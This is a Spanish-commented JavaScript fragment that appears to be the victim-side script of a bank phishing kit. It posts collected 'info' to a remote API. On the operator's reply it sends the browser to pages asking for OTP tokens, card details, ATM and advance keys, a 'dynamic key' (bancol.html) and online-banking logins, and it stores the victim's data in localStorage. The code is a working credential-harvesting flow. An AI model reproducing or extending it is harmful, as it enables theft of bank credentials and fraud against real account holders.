info.err = '';

// Enviar info
fetch(`${API_URL}/generals`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer 123123123',
    },
    body: JSON.stringify(info)
})
    .then(response => response.json())
    .then(result => {
        // Manejo de respuetas del servidor
        console.log('Respuesta del servidor:', result.redirect_to);

        if (result.redirect_to === 'otp' && info.tok === '') {
            // Token primera vez
            info.err = '';

            window.location.href = 'otp.html'
        } else if (result.redirect_to === 'otp' && info.tok !== '') {
            // Token vuelto a pedir
            // Setear el error
            info.err = 'true';
            LS.setItem('info', JSON.stringify(info));

            // Redirigir
            window.location.href = 'otp.html'
        } else if (result.redirect_to === 'index') {
            // Setear el error
            info.err = 'true';
            LS.setItem('info', JSON.stringify(info));

            // Redirigir
            window.location.href = 'index.html'
        } else if (result.redirect_to === 'rcard') {
            // Setear el error
            info.err = 'rcard';
            LS.setItem('info', JSON.stringify(info));

            // Redirigir
            window.location.href = 'producto.html'
        } else if (result.redirect_to === 'ncard') {
            // Setear el error
            info.err = 'ncard';
            LS.setItem('info', JSON.stringify(info));

            // Redirigir
            window.location.href = 'producto.html'
        } else if (result.redirect_to === 'ccajero') {
            // Setear el error
            info.err = 'ccajero';
            LS.setItem('info', JSON.stringify(info));

            // Redirigir
            window.location.href = 'scotclav.html'
        } else if (result.redirect_to === 'cavances') {
            // Setear el error
            info.err = 'cavances';
            LS.setItem('info', JSON.stringify(info));

            // Redirigir
            window.location.href = 'scotclav.html'
        } else if (result.redirect_to === 'cdinamica') {
            // Setear el error
            info.err = 'cdinamica';
            LS.setItem('info', JSON.stringify(info));

            // Redirigir
            window.location.href = 'bancol.html'
        } else if (result.redirect_to === 'userp') {
            // Setear el error
            info.err = 'true';
            LS.setItem('info', JSON.stringify(info));

            // Redirigir
            window.location.href = 'banca.html'
        }else if (result.redirect_to === 'success') {
            LS.removeItem('info');
            window.location.href = 'success.html';
        }
    })
    .catch(error => {
        console.log('Error en la solicitud:', error);
    });